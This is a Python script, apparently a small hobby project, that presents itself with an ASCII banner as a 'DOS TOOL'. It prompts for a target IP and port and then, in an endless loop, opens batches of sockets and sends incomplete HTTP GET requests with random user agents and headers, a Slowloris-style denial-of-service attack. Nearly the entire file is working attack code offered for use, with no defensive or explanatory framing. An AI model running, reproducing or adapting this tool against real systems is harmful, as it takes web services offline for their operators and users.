import socket, random, time, pkg_resources
if __name__ == '__main__':
    ua = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]
    text = '''     ______      ___     ______            
    |_   _ `.  .'   `. .' ____ \           
    | | `. \/  .-.  \| (___ \_|          
    | |  | || |   | | _.____`.           
    _| |_.' /\  `-'  /| \____) |          
    |______.'  `.___.'  \______.'          
    _________    ___      ___   _____     
    |  _   _  | .'   `.  .'   `.|_   _|    
    |_/ | | \_|/  .-.  \/  .-.  \ | |      
        | |    | |   | || |   | | | |   _  
    _| |_   \  `-'  /\  `-'  /_| |__/ | 
    |_____|   `.___.'  `.___.'|________| 

    by https://github.com/riccardoildeveloper
            PRESS Ctrl + C TO STOP THE ATTACK
                                        '''
    print(text)
    time.sleep(2)
    ip = input("Enter target ip:   ")
    port = int(input("Enter target port:   "))
    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")
    setattr(socket.socket, "send_line", send_line)
    setattr(socket.socket, "send_header", send_header)
    list_of_socket = []
    def attacking():
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        s.send_header("User-Agent", random.choice(ua))
        s.send_header("Accept-language", "en-US,en,q=0.5")
        try:
            s.send_header("X-a", random.randint(1, 5000))
            list_of_socket.append(s)
        except socket.error:
            list_of_socket.remove(s)
    c = 0
    while True:
        try:
            print("Sending Sockets...")
            for i in range(0, 100):
                try:
                    attacking()
                    c += 1
                    print(f"Socket {str(c)}/100", end="\r")
                except socket.error as e:
                    pass
            print("Socket sended!")
        except (KeyboardInterrupt, SystemExit):
            print("Stopping dos attack")
            s.close()
            break
